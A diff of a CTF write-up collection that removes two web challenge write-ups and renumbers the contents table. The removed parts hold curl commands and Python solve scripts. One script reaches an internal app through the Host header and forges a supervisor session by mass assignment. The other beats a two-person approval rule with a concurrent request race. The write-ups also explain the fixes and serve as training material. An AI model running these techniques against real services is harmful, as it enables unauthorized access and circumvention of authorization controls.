@@ -6,56 +6,54 @@
 
 **Final scoreboard:** 216th place · 10,046 points · 42 credited solves (hint costs included)
 
-This document contains 44 write-ups: the 42 credited solves plus two challenges solved but not counted on the scoreboard (marked below). Each one gives the approach step by step, the dead ends that mattered, and a solve script (see the appendix) that recomputes the flag from the provided files. Flags are redacted as `CSCTF{...}`.
+This document contains 42 write-ups, one per credited solve. Each one gives the approach step by step, the dead ends that mattered, and a solve script (see the appendix) that recomputes the flag from the provided files. Flags are redacted as `CSCTF{...}`.
 
 ## Summary
 
 | # | Challenge | Category | Solves | Notes |
 |---|---|---|---|---|
 | 1 | [Operation Dawn: The Command](#operation-dawn-the-command) | Web | — |  |
-| 2 | [Switchboard](#switchboard) | Web | 170 | not counted on the scoreboard |
-| 3 | [Two-Key Turn](#two-key-turn) | Web | 194 | not counted on the scoreboard |
-| 4 | [Afterimage](#afterimage) | Forensics | 105 |  |
-| 5 | [Briefing for One](#briefing-for-one) | Forensics | 82 |  |
-| 6 | [Capability Ghost](#capability-ghost) | Forensics | 106 |  |
-| 7 | [CAPTCHA THE WATER PLANT](#captcha-the-water-plant) | Forensics | 32 | hint used |
-| 8 | [Code Red Freight](#code-red-freight) | Forensics | 102 |  |
-| 9 | [Dawn Array](#dawn-array) | Forensics | 99 |  |
-| 10 | [Flotsam](#flotsam) | Forensics | 100 |  |
-| 11 | [Ghost in the Historian](#ghost-in-the-historian) | Forensics | 107 |  |
-| 12 | [Interlock Witness](#interlock-witness) | Forensics | 99 |  |
-| 13 | [Last Buffer](#last-buffer) | Forensics | 119 |  |
-| 14 | [Last Commit](#last-commit) | Forensics | 118 |  |
-| 15 | [Night Clerk](#night-clerk) | Forensics | 45 |  |
-| 16 | [Operation Dawn: Relay Snapshot](#operation-dawn-relay-snapshot) | Forensics | 42 |  |
-| 17 | [Operation Dawn: The Burnt Server](#operation-dawn-the-burnt-server) | Forensics | 61 |  |
-| 18 | [Operation Dawn: The Relay Tap](#operation-dawn-the-relay-tap) | Forensics | 36 |  |
-| 19 | [Phantom Drift](#phantom-drift) | Forensics | 124 |  |
-| 20 | [Polyglot Requiem](#polyglot-requiem) | Forensics | 108 |  |
-| 21 | [Redline](#redline) | Forensics | 127 |  |
-| 22 | [Signal Reconciliation](#signal-reconciliation) | Forensics | 51 |  |
-| 23 | [Silent Breaker](#silent-breaker) | Forensics | 81 |  |
-| 24 | [Tone Burst](#tone-burst) | Forensics | 113 |  |
-| 25 | [Dark Anchorage Reconciliation](#dark-anchorage-reconciliation) | Network | 101 | hint used |
-| 26 | [Ghost Signal](#ghost-signal) | Network | 145 | hint used |
-| 27 | [Grid Watch](#grid-watch) | Network | 75 |  |
-| 28 | [Hard Landing](#hard-landing) | Network | 86 |  |
-| 29 | [Radar Silence](#radar-silence) | Network | 158 |  |
-| 30 | [Severed Link](#severed-link) | Network | 84 |  |
-| 31 | [Water Hammer Reconciliation](#water-hammer-reconciliation) | Network | 124 |  |
-| 32 | [Carrier Shadow](#carrier-shadow) | Reverse / Malware | 264 |  |
-| 33 | [Ghost Bank](#ghost-bank) | Reverse / Malware | 29 |  |
-| 34 | [Ground Lock](#ground-lock) | Reverse / Malware | 163 |  |
-| 35 | [HELIOS-RTU](#helios-rtu) | Reverse / Malware | 52 |  |
-| 36 | [Operation Dawn: Radio Recovery](#operation-dawn-radio-recovery) | Reverse / Malware | 156 |  |
-| 37 | [PoshTerm](#poshterm) | Reverse / Malware | 126 |  |
-| 38 | [The Lock Box](#the-lock-box) | Reverse / Malware | 166 |  |
-| 39 | [Operation Blackout](#operation-blackout) | ICS / SCADA | 138 |  |
-| 40 | [Operation Dawn: The Sentry's Model](#operation-dawn-the-sentrys-model) | ML / AI | 261 |  |
-| 41 | [Command Calendar Reconciliation](#command-calendar-reconciliation) | Miscellaneous | 141 |  |
-| 42 | [Operation Dawn: The Shared Model](#operation-dawn-the-shared-model) | Miscellaneous | 213 |  |
-| 43 | [The Reconnaissance Plate](#the-reconnaissance-plate) | Miscellaneous | 96 |  |
-| 44 | [Watch List Audit](#watch-list-audit) | Miscellaneous | 243 |  |
+| 2 | [Afterimage](#afterimage) | Forensics | 105 |  |
+| 3 | [Briefing for One](#briefing-for-one) | Forensics | 82 |  |
+| 4 | [Capability Ghost](#capability-ghost) | Forensics | 106 |  |
+| 5 | [CAPTCHA THE WATER PLANT](#captcha-the-water-plant) | Forensics | 32 | hint used |
+| 6 | [Code Red Freight](#code-red-freight) | Forensics | 102 |  |
+| 7 | [Dawn Array](#dawn-array) | Forensics | 99 |  |
+| 8 | [Flotsam](#flotsam) | Forensics | 100 |  |
+| 9 | [Ghost in the Historian](#ghost-in-the-historian) | Forensics | 107 |  |
+| 10 | [Interlock Witness](#interlock-witness) | Forensics | 99 |  |
+| 11 | [Last Buffer](#last-buffer) | Forensics | 119 |  |
+| 12 | [Last Commit](#last-commit) | Forensics | 118 |  |
+| 13 | [Night Clerk](#night-clerk) | Forensics | 45 |  |
+| 14 | [Operation Dawn: Relay Snapshot](#operation-dawn-relay-snapshot) | Forensics | 42 |  |
+| 15 | [Operation Dawn: The Burnt Server](#operation-dawn-the-burnt-server) | Forensics | 61 |  |
+| 16 | [Operation Dawn: The Relay Tap](#operation-dawn-the-relay-tap) | Forensics | 36 |  |
+| 17 | [Phantom Drift](#phantom-drift) | Forensics | 124 |  |
+| 18 | [Polyglot Requiem](#polyglot-requiem) | Forensics | 108 |  |
+| 19 | [Redline](#redline) | Forensics | 127 |  |
+| 20 | [Signal Reconciliation](#signal-reconciliation) | Forensics | 51 |  |
+| 21 | [Silent Breaker](#silent-breaker) | Forensics | 81 |  |
+| 22 | [Tone Burst](#tone-burst) | Forensics | 113 |  |
+| 23 | [Dark Anchorage Reconciliation](#dark-anchorage-reconciliation) | Network | 101 | hint used |
+| 24 | [Ghost Signal](#ghost-signal) | Network | 145 | hint used |
+| 25 | [Grid Watch](#grid-watch) | Network | 75 |  |
+| 26 | [Hard Landing](#hard-landing) | Network | 86 |  |
+| 27 | [Radar Silence](#radar-silence) | Network | 158 |  |
+| 28 | [Severed Link](#severed-link) | Network | 84 |  |
+| 29 | [Water Hammer Reconciliation](#water-hammer-reconciliation) | Network | 124 |  |
+| 30 | [Carrier Shadow](#carrier-shadow) | Reverse / Malware | 264 |  |
+| 31 | [Ghost Bank](#ghost-bank) | Reverse / Malware | 29 |  |
+| 32 | [Ground Lock](#ground-lock) | Reverse / Malware | 163 |  |
+| 33 | [HELIOS-RTU](#helios-rtu) | Reverse / Malware | 52 |  |
+| 34 | [Operation Dawn: Radio Recovery](#operation-dawn-radio-recovery) | Reverse / Malware | 156 |  |
+| 35 | [PoshTerm](#poshterm) | Reverse / Malware | 126 |  |
+| 36 | [The Lock Box](#the-lock-box) | Reverse / Malware | 166 |  |
+| 37 | [Operation Blackout](#operation-blackout) | ICS / SCADA | 138 |  |
+| 38 | [Operation Dawn: The Sentry's Model](#operation-dawn-the-sentrys-model) | ML / AI | 261 |  |
+| 39 | [Command Calendar Reconciliation](#command-calendar-reconciliation) | Miscellaneous | 141 |  |
+| 40 | [Operation Dawn: The Shared Model](#operation-dawn-the-shared-model) | Miscellaneous | 213 |  |
+| 41 | [The Reconnaissance Plate](#the-reconnaissance-plate) | Miscellaneous | 96 |  |
+| 42 | [Watch List Audit](#watch-list-audit) | Miscellaneous | 243 |  |
 
 ## Methodology and AI usage
 
@@ -166,350 +164,6 @@ Solve script: `solve/solve.py` (see Appendix)
 - Python 3 (`re`, `urllib.parse.unquote`)
 - [nginx log format docs](https://nginx.org/en/docs/http/ngx_http_log_module.html)
 - Blind time-based SQLi: [OWASP Testing Guide – OTG-INPVAL-005](https://owasp.org/www-project-web-security-testing-guide/)
-
-
-### Switchboard
-
-| Category | Solves | Solved | First blood | Hint used | Solved by | Challenge author |
-|---|---|---|---|---|---|---|
-| web | 170 | ✅ (not counted) | — | no | 0xAr3s-root | Iulian Schifirnet |
-
-#### Challenge description
-
-> The Vardanne Joint Operations Directorate, coordinating Vardanne's part in the Operation
-> Dawn coalition, runs an old voice exchange whose public board shows the state of its trunk
-> circuits. The duty desk reaches a separate exchange controller over the internal trunk, and
-> that controller can export the current trunk crypto key, but only to a rostered supervisor.
->
-> Reach the controller and export the key. Start your own instance from this page and work
-> only against the address it gives you.
->
-> Flag format: `CSCTF{...}`
-
-**Target:** a per-player instance at `http://w06.ctf.chronos-security.ro:<port>` (30-minute
-TTL).
-
-#### TL;DR
-
-The public line-status board and the "internal-only" exchange controller are served by the
-**same backend on the same host:port**, routed purely by the `Host` header. Sending
-`Host: exch-ctl.vjod.internal` — a hostname only disclosed, base64-encoded, in the public
-board's JS — reaches the controller directly (an SSRF-equivalent bypass with no SSRF payload
-needed, just a header). The controller's `POST /auth` accepts a client-supplied `role` field
-and bakes it unchecked into the signed session cookie (mass assignment), so
-`{"username": "x", "role": "supervisor"}` mints a supervisor session for free.
-`GET /export/trunk-key` with that cookie returns the flag.
-
-#### Approach
-
-**1. Recon — the public board**
-
-```bash
-curl -s http://w06.ctf.chronos-security.ro:34144/
-```
-
-A simple "Line status" dashboard for voice trunks, polling `GET /api/lines` every 30s.
-Nothing obviously exploitable on the board itself (read-only JSON, no SSRF parameter). The
-page footer mentions a "Service endpoints" block with an "Exchange controller" entry shown
-as `checking…`, filled in by JS.
-
-**2. The hostname leak in `switchboard.js`**
-
-```bash
-curl -s http://w06.ctf.chronos-security.ro:34144/static/switchboard.js
-```
-
-```js
-// Exchange controller endpoint, as configured by the NOC. Shown for reference
-// only; the browser cannot reach it from here (separate trunk, different host),
-// so the live figures below are read from the public status API instead.
-var controller = atob("ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==");
-```
-
-`atob("ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==")` → `exch-ctl.vjod.internal`. The comment insists
-the *browser* can't reach it ("separate trunk, different host") — true for a client-side
-fetch bound by the Same-Origin Policy and DNS, but says nothing about what happens if *we*,
-as an HTTP client, simply ask the same server for that Host.
-
-**3. Host-header routing = free SSRF**
-
-```bash
-curl -s http://w06.ctf.chronos-security.ro:34144/ \
-  -H "Host: exch-ctl.vjod.internal"
-```
-
-This returns a *completely different application*: "Overview - Exchange controller",
-"RESTRICTED · STAFF ONLY", with its own API table:
-
-| Method | Path                 | Purpose                                      | Access            |
-|--------|----------------------|-----------------------------------------------|-------------------|
-| POST   | `/auth`              | Open an operator session. Body: `username`.    | internal trunk    |
-| GET    | `/operators`         | Duty roster and your current session.          | operator session  |
-| GET    | `/export/trunk-key`  | Export the current trunk crypto key.           | **supervisor**    |
-| GET    | `/healthz`           | Liveness.                                      | any               |
-
-The single backend process serves two logical sites and picks which one by matching the
-`Host` header against `exch-ctl.vjod.internal` exactly — any other Host (including none, or
-garbage) falls back to the public board. No separate "internal trunk" network isolation is
-actually enforced; the "internal-only" claim is purely cosmetic.
-
-**4. Trivial authentication, then mass assignment**
-
-```bash
-curl -s -X POST http://w06.ctf.chronos-security.ro:34144/auth \
-  -H "Host: exch-ctl.vjod.internal" -H "Content-Type: application/json" \
-  -d '{"username":"test"}'
-# {"ok":true,"operator":"test","role":"operator"}
-```
-
-As documented, no password is asked. The returned `role` is always `"operator"` for a plain
-username — until you notice the body is parsed permissively and a client-supplied `role`
-field is accepted straight through:
-
-```bash
-curl -s -i -X POST http://w06.ctf.chronos-security.ro:34144/auth \
-  -H "Host: exch-ctl.vjod.internal" -H "Content-Type: application/json" \
-  -d '{"username":"test","role":"supervisor"}'
-```
-
-```
-Set-Cookie: ctl_sid=eyJvcGVyYXRvciI6InRlc3QiLCJyb2xlIjoic3VwZXJ2aXNvciJ9.avB34w.Do2O... ; HttpOnly
-{"ok":true,"operator":"test","role":"supervisor"}
-```
-
-The decoded cookie payload is simply `{"operator":"test","role":"supervisor"}` — the server
-signs whatever role it's handed, it never derives it server-side from the roster
-(`GET /operators` shows real supervisors like `R. Antonescu`/`EX-01`, but impersonating
-their name or callsign still only yields `role: "operator"`; only sending the `role` field
-itself works).
-
-**5. Exporting the key**
-
-```bash
-curl -s http://w06.ctf.chronos-security.ro:34144/export/trunk-key \
-  -H "Host: exch-ctl.vjod.internal" \
-  -H "Cookie: ctl_sid=eyJvcGVyYXRvciI6InRlc3QiLCJyb2xlIjoic3VwZXJ2aXNvciJ9.avB34w.Do2OxQWWbZo5oKmOcimIHILssIY"
-```
-
-```json
-{
-  "algorithm": "AES-256-GCM",
-  "exported_by": "test",
-  "key_id": "KTK-2026-10-B",
-  "trunk_key": "CSCTF{...} (redacted)",
-  "valid_from": "2026-11-08T13:17:57Z"
-}
-```
-
-Solve script: `solve/solve.py` (see Appendix)
-
-```bash
-python3 solve/solve.py http://w06.ctf.chronos-security.ro:34144
-```
-
-```
-[+] Reaching internal controller via Host: exch-ctl.vjod.internal
-[+] POST /auth -> {'ok': True, 'operator': 'ctf-player', 'role': 'supervisor'}
-[+] Session cookie: ctl_sid=...
-[+] GET /export/trunk-key -> { ... "trunk_key": "CSCTF{...} (redacted)" ... }
-[+] Flag: CSCTF{...} (redacted)
-```
-
-#### Flag
-
-`CSCTF{...} (redacted)`
-
-#### Reflections
-
-- **Host-header-based "isolation" is not network isolation.** The challenge's flavour text
-  ("the browser cannot reach it… separate trunk, different host") describes a *client-side*
-  limitation (Same-Origin Policy / DNS resolution), not a server-side control. Any HTTP
-  client that can set an arbitrary `Host` header defeats this instantly — this is the same
-  class of bug as classic SSRF, except we don't even need the server to proxy a request for
-  us: the "internal" app is reachable directly, on the exact same socket.
-- **Never trust client-supplied fields that influence authorization**, especially when the
-  field name matches an internal privilege concept 1:1 (`role`). The fix is to derive `role`
-  purely server-side (from the authenticated identity against the roster, never from request
-  body) and to never let request-body mass assignment reach security-sensitive session
-  fields.
-- Decoding the base64 "reference only" hostname was the real giveaway that the challenge
-  wanted Host-header pivoting rather than, say, a literal SSRF parameter — when an app
-  explains in a comment exactly *why* you supposedly can't reach something, that's worth
-  testing from outside the browser's constraints.
-
-#### Tools & references
-
-- `curl -H "Host: ..."` to reach a Host-header-routed vhost directly
-- Mass assignment: [OWASP — Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
-- Host header attacks: [PortSwigger — HTTP Host header attacks](https://portswigger.net/web-security/host-header)
-
-
-### Two-Key Turn
-
-| Category | Solves | Solved | First blood | Hint used | Solved by | Challenge author |
-|---|---|---|---|---|---|---|
-| web | 194 | ✅ (not counted) | — | no | 0xAr3s-root | Chronos Security |
-
-#### Challenge description
-
-> Kessara's coastal fire-authorization console arms a fire order only when two DISTINCT
-> officers approve it — the two-person rule. A hostile insider holds one officer's credentials
-> (VEGA-7). One order is still awaiting authorization: drive it to ARMED with your single
-> credential and read its arming authorization.
->
-> The API is self-describing at `GET /schema`. Your operator key is
-> `opk_vega7_2f4b9c17e0a3` — send it as `Authorization: Bearer <key>`. Interact only with
-> your assigned instance.
->
-> Flag format: `CSCTF{...}`
-
-**Target:** a per-player instance at `http://w05.ctf.chronos-security.ro:<port>` (spun up with
-a 30-minute TTL).
-
-#### TL;DR
-
-The two-person rule's "one approval per officer" check is a classic **TOCTOU race
-condition**: firing a burst of concurrent `POST /orders/{id}/approve` requests with the
-*same* operator key lets several requests read "0 prior approvals" before any of them
-commits its own record. Two of them each write an approval record for `VEGA-7`,
-`approvals` reaches `required_approvals = 2`, the order flips to `ARMED`, and the response
-carries `arming_authorization` — the flag.
-
-#### Approach
-
-**1. Recon — reading the self-describing schema**
-
-```bash
-curl -s http://w05.ctf.chronos-security.ro:34125/schema | jq
-```
-
-```json
-{
-  "authorization_model": {
-    "two_person_rule": "an order arms only when TWO DISTINCT officers have each cast APPROVE (required_approvals = 2)",
-    "approve": "idempotent per officer while an approval window is pending",
-    "pending_ttl_seconds": 8.0,
-    "concurrent_action": "an ordinary 6-8 separate-connection approval burst is supported"
-  },
-  "routes": {
-    "GET /orders": "list fire orders and retry information",
-    "GET /orders/{id}": "order detail; arming_authorization appears only after ARMED",
-    "POST /orders/{id}/approve": "cast one approval on the order"
-  },
-  "your_officer": "VEGA-7",
-  "issued_operator_credential": "opk_vega7_2f4b9c17e0a3"
-}
-```
-
-Two phrases stand out immediately:
-
-- `approve` is **"idempotent per officer while an approval window is pending"** — a
-  statement about a *check*, not a guarantee of how it's implemented.
-- The server explicitly says it **supports** "an ordinary 6-8 separate-connection approval
-  burst" — a strong, almost too-helpful hint that sending several approvals at once on
-  separate connections is the intended interaction, and that the server's concurrency
-  handling is exactly what's being tested.
-
-**2. Finding the target order**
-
-```bash
-curl -s http://w05.ctf.chronos-security.ro:34125/orders \
-  -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3"
-```
-
-```json
-{"orders":[
-  {"id":"AO-7D31C9","battery":"Coastal Battery 3 (Saltmarsh)","status":"PENDING_AUTH","approvals":0,"required_approvals":2},
-  {"id":"AO-19F4E2","status":"REJECTED", "...":"..."},
-  {"id":"AO-A8C506","status":"EXECUTED",  "...":"..."},
-  {"id":"AO-CE472A","status":"DRAFT",     "...":"..."}
-]}
-```
-
-`AO-7D31C9` is the only order `PENDING_AUTH` — our target.
-
-**3. The race**
-
-"Idempotent per officer" almost always means the server does something like:
-
-```
-if officer not in order.approved_by:
-    order.approved_by.add(officer)
-    order.approvals += 1
-```
-
-That is a classic **read-check-then-write** (TOCTOU) pattern. If two requests from the
-same officer hit the handler concurrently, both can pass the `if` check (reading the same
-"not yet approved" state) before either one finishes writing — each then appends its own
-approval record, and `approvals` ends up counting the *same* officer twice instead of
-being capped at one.
-
-Fire a burst of concurrent approvals from separate connections:
-
-```bash
-for i in $(seq 1 8); do
-  curl -s -X POST http://w05.ctf.chronos-security.ro:34125/orders/AO-7D31C9/approve \
-    -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3" &
-done
-wait
-```
-
-Result — two of the eight requests race past the check before the first write lands:
-
-```json
-{"status":"ARMED","approvals":2,"required_approvals":2,
- "approval_records":[
-   {"record_id":"APR-1-1","officer":"VEGA-7","epoch":1},
-   {"record_id":"APR-1-2","officer":"VEGA-7","epoch":1}
- ],
- "arming_authorization":"CSCTF{...} (redacted)"}
-```
-
-Both approval records belong to `VEGA-7` — the "two distinct officers" rule was bypassed
-entirely using a single credential, purely by winning the race within the 8-second pending
-window.
-
-Solve script: `solve/solve.py` (see Appendix)
-
-```bash
-python3 solve/solve.py http://w05.ctf.chronos-security.ro:34125
-```
-
-```
-[+] Target order: AO-7D31C9
-[+] Firing 8 concurrent approve() requests (race condition)...
-[+] Order status : ARMED
-[+] Approvals    : 2/2
-      - APR-1-1 by VEGA-7 (epoch 1)
-      - APR-1-2 by VEGA-7 (epoch 1)
-[+] Flag: CSCTF{...} (redacted)
-```
-
-#### Flag
-
-`CSCTF{...} (redacted)`
-
-#### Reflections
-
-- The schema practically names the vulnerability class: "idempotent... while pending" is a
-  state-check guarantee, and "concurrent action... burst is supported" is an invitation to
-  test *how* concurrency is handled, not just *that* it's handled.
-- This is the same bug class as double-spend / double-redeem races in payment and voting
-  systems: any "has this actor already done X?" check that isn't enforced atomically
-  (e.g. a unique constraint at the data layer, or a lock/mutex around the whole
-  check-and-increment) can be beaten by parallel requests landing inside the same window.
-- The fix is straightforward: enforce "one approval per officer per order" with an atomic
-  operation — a DB unique constraint on `(order_id, officer)`, a compare-and-swap, or a
-  per-order lock held across the whole check-then-increment — instead of a
-  read-then-write pair that leaves a gap for other threads/requests to land in.
-- No authentication bypass was needed: the whole exploit uses only the single credential
-  we were issued, abusing timing instead of identity.
-
-#### Tools & references
-
-- `curl` with background jobs (`&` / `wait`) for a cheap concurrent HTTP burst
-- Python `concurrent.futures.ThreadPoolExecutor` for the scripted version
-- TOCTOU / race condition fundamentals: [OWASP — Race Condition](https://owasp.org/www-community/vulnerabilities/Race_condition)
 
 
 ## Forensics
@@ -3776,163 +3430,6 @@ print(f"[+] Token length : {max_pos}")
 if missing:
     print(f"[!] Missing positions: {missing}")
 print(f"[+] Recovered token: {token}")
-~~~~
-
-### Switchboard — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""
-Switchboard (web/easy) - CSCTF 2026 "Total Warfare"
-
-Chain:
-  1. The public line-status board's JS base64-decodes the internal exchange
-     controller's hostname (exch-ctl.vjod.internal) for display only - the
-     browser "can't reach it", but the backend is a single server that routes
-     by the Host header, so sending that Host string to the SAME host:port
-     reaches the internal "Exchange controller" app directly (SSRF via
-     Host-header-based virtual hosting).
-  2. POST /auth {"username": "<anything>"} opens a session cookie with
-     role=operator, no real authentication required ("sessions opened from
-     inside the exchange network do not ask for a password").
-  3. The /auth handler performs mass assignment: it also accepts a "role"
-     field straight from the client and bakes it into the signed session
-     cookie unchanged, so POST /auth {"username": "x", "role": "supervisor"}
-     mints a supervisor session for free.
-  4. GET /export/trunk-key with that cookie requires only role=supervisor
-     and returns the trunk crypto key, which contains the flag.
-
-Usage:
-    python3 solve.py [base_url] [controller_host]
-"""
-import sys
-import json
-import urllib.request
-
-BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://w06.ctf.chronos-security.ro:34144"
-CONTROLLER_HOST = sys.argv[2] if len(sys.argv) > 2 else "exch-ctl.vjod.internal"
-
-
-def request(path, method="GET", body=None, cookie=None):
-    headers = {"Host": CONTROLLER_HOST}
-    data = None
-    if body is not None:
-        data = json.dumps(body).encode()
-        headers["Content-Type"] = "application/json"
-    if cookie:
-        headers["Cookie"] = cookie
-    req = urllib.request.Request(BASE_URL + path, data=data, headers=headers, method=method)
-    with urllib.request.urlopen(req) as resp:
-        set_cookie = resp.headers.get("Set-Cookie")
-        payload = json.loads(resp.read())
-        return payload, set_cookie
-
-
-def main():
-    print(f"[+] Reaching internal controller via Host: {CONTROLLER_HOST}")
-
-    # Step 1: trivial session, role baked in client-side (mass assignment)
-    payload, set_cookie = request(
-        "/auth", method="POST", body={"username": "ctf-player", "role": "supervisor"}
-    )
-    print(f"[+] POST /auth -> {payload}")
-    cookie = set_cookie.split(";", 1)[0]
-    print(f"[+] Session cookie: {cookie}")
-
-    # Step 2: export the trunk key with the forged supervisor session
-    key_payload, _ = request("/export/trunk-key", cookie=cookie)
-    print(f"[+] GET /export/trunk-key -> {json.dumps(key_payload, indent=2)}")
-    print(f"[+] Flag: {key_payload['trunk_key']}")
-
-
-if __name__ == "__main__":
-    main()
-~~~~
-
-### Two-Key Turn — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""
-Two-Key Turn (web/easy) - CSCTF 2026 "Total Warfare"
-
-The console enforces a two-person rule: a fire order arms only once two
-DISTINCT officers have each cast one APPROVE. We only hold a single
-officer's credential (VEGA-7). "approve" is documented as "idempotent per
-officer while an approval window is pending" - but idempotency checks like
-this are commonly implemented as a non-atomic read-check-then-write, which
-is vulnerable to a classic TOCTOU race condition.
-
-By firing a burst of POST /orders/{id}/approve requests concurrently (on
-separate connections, as the schema itself hints is "supported"), several
-requests can read "0 prior approvals from VEGA-7" before any of them has
-written its own approval record. Each one then writes its own record,
-letting a single officer register two approvals and reach
-required_approvals = 2, arming the order and releasing the flag.
-
-Usage:
-    python3 solve.py [base_url] [order_id]
-"""
-import sys
-import concurrent.futures
-import urllib.request
-import json
-
-BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://w05.ctf.chronos-security.ro:34125"
-OPERATOR_KEY = "opk_vega7_2f4b9c17e0a3"
-HEADERS = {"Authorization": f"Bearer {OPERATOR_KEY}"}
-BURST_SIZE = 8  # within the advertised "6-8 separate-connection" burst window
-
-
-def get(path):
-    req = urllib.request.Request(BASE_URL + path, headers=HEADERS)
-    with urllib.request.urlopen(req) as resp:
-        return json.loads(resp.read())
-
-
-def approve(order_id):
-    req = urllib.request.Request(
-        f"{BASE_URL}/orders/{order_id}/approve", headers=HEADERS, method="POST"
-    )
-    try:
-        with urllib.request.urlopen(req) as resp:
-            return json.loads(resp.read())
-    except urllib.error.HTTPError as e:
-        return json.loads(e.read())
-
-
-def find_pending_order():
-    orders = get("/orders")["orders"]
-    for o in orders:
-        if o["status"] == "PENDING_AUTH":
-            return o["id"]
-    raise RuntimeError("no PENDING_AUTH order found")
-
-
-def main():
-    order_id = sys.argv[2] if len(sys.argv) > 2 else find_pending_order()
-    print(f"[+] Target order: {order_id}")
-
-    print(f"[+] Firing {BURST_SIZE} concurrent approve() requests (race condition)...")
-    with concurrent.futures.ThreadPoolExecutor(max_workers=BURST_SIZE) as pool:
-        results = list(pool.map(lambda _: approve(order_id), range(BURST_SIZE)))
-
-    armed = [r for r in results if r.get("status") == "ARMED"]
-    if not armed:
-        print("[-] Order did not arm. Last response:")
-        print(json.dumps(results[-1], indent=2))
-        sys.exit(1)
-
-    final = armed[-1]
-    print(f"[+] Order status : {final['status']}")
-    print(f"[+] Approvals    : {final['approvals']}/{final['required_approvals']}")
-    for rec in final["approval_records"]:
-        print(f"      - {rec['record_id']} by {rec['officer']} (epoch {rec['epoch']})")
-    print(f"[+] Flag: {final['arming_authorization']}")
-
-
-if __name__ == "__main__":
-    main()
 ~~~~
 
 ### Afterimage — `solve/solve.py`
